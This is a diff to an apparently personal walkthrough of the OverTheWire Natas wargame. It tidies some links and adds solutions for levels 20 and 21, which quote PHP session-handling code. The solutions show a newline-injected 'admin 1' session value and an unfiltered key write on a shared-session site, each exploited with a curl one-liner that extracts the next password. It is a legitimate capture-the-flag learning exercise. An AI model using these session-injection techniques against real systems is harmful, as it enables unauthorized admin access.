@@ -713,7 +713,7 @@ This will expand to the password, which will make the outer `grep` to search for
 $(grep ^<injection> /etc/natas_webpass/natas17)password
 ```
 
-We can reuse the code from the last challenge to get [this (without asyncio)](files/natas/natas16.py) and [this (with asyncio)](files/natas/natas16_async.py):
+We can reuse the code from the last challenge to get [this (with asyncio)](files/natas/natas16_async.py) and [this (without asyncio)](files/natas/natas16.py):
 
 ```python
 #!/usr/bin/env python3
@@ -803,7 +803,7 @@ Alright, so we have another SQL challenge, but this time, it looks like the `ech
 
 We can take advantage of MySQL's [`SLEEP`](https://dev.mysql.com/doc/internals/en/sleep.html) command, which allows us to do a timing attack on SQL.
 
-[Asyncio](files/natas/natas17_async.py).\
+[Asyncio](files/natas/natas17_async.py)\
 [Without Asyncio](files/natas/natas17.py):
 
 ```python
@@ -981,7 +981,7 @@ function createID($user) { /* {{{ */
 
 Looks like the session ID is just a random integer between 1 and 640. Looks like we can just brute force the admin's session by checking every session ID in that range.
 
-[Asyncio](files/natas/natas18_async.py).\
+[Asyncio](files/natas/natas18_async.py)\
 [Without Asyncio](files/natas/natas18.py):
 
 ```python
@@ -1024,7 +1024,7 @@ $ echo 3335362d61646d696e | xxd -r -p
 
 Looks like the format is the `<id>-<user>`. We can reuse our script from the last challenge for this.
 
-[Asyncio](files/natas/natas19_asnyc.py).
+[Asyncio](files/natas/natas19_asnyc.py)\
 [Without Asyncio](files/natas/natas19.py):
 
 ```python
@@ -1048,4 +1048,313 @@ def find_password():
 
 if __name__ == '__main__':
     print(find_password())
+```
+
+## Level 20
+
+![natas20_index.jpg](screenshots/natas/natas20_index.jpg)
+
+[Sourcecode](http://natas20.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) {
+    //debug("MYOPEN $path $name");
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug("MYCLOSE");
+    return true;
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid");
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug("MYGARBAGE $t");
+    return true;
+}
+
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+
+<form action="index.php" method="POST">
+Your name: <input name="name" value="<?=$name?>"><br>
+<input type="submit" value="Change name" />
+</form>
+```
+
+Another challenge with a lot of code to read through. Once again, we start with our goal and work backwards:
+
+```php
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    }
+```
+
+Looks like session hijacking challenge. Let's check for references to the `print_credentials` function:
+
+```php
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+```
+
+Alright, so it looks like this challenge uses custom session handlers, which are set with [session_set_save_handler](https://www.php.net/manual/en/function.session-set-save-handler.php). This modifies how the [session_start](https://www.php.net/manual/en/function.session-start.php) function works when it's called.
+
+We need to look into the `myread` function since that is what will be used to check our session ID.
+
+```php
+function myread($sid) {
+    debug("MYREAD $sid");
+    // Make sure SID is alphanumeric or -
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    // Check to see if already session exists
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    // Read session array values from file
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    // Split by newlines
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    // Split key/value pairs by spaces
+    $parts = explode(" ", $line, 2);
+    // Set session array values
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+```
+
+Look's like we've got something interesting here. Apparently it reads the session parameters from a file, which then parses the file line by line and splits the values by spaces using the [explode](https://www.php.net/manual/en/function.explode.php) function.
+
+Next, we do a quick check of the `mywrite` function to make sure there are no curveballs such as input validation.
+
+```php
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+```
+
+Looks like we're in the clear. This should be an easy solve. All we have to do is send any random name and add our `admin 1` after a newline character.
+
+We will need to send two requests to get the password. The first to set the session's variables with `mywrite`, then the second to load the page with our newly set session variables.
+
+```bash
+curl -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -I -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/index.php?name=admin%0aadmin+1" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas20_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 21
+
+![natas21_index.jpg](screenshots/natas/natas21_index.jpg)
+
+[Sourcecode](http://natas21.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?>
+```
+
+Looks like we have a colocated site, [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org), which shares session cookies with this one. Let's see what's on the other page:
+
+![natas21_experimenter_index.jpg](screenshots/natas/natas21_experimenter_index.jpg)
+
+[Sourcecode](http://natas21-experimenter.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?>
+```
+
+Although it looks like it's filtering for valid keys, if we look at this section here:
+
+```php
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+```
+
+We can see that if `submit` is a parameter, it will just set every key/value pair, regardless of the key. Easy enough. All we have to do is submit a request with `admin=1&submit`.
+
+```bash
+curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -I -s "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
 ```
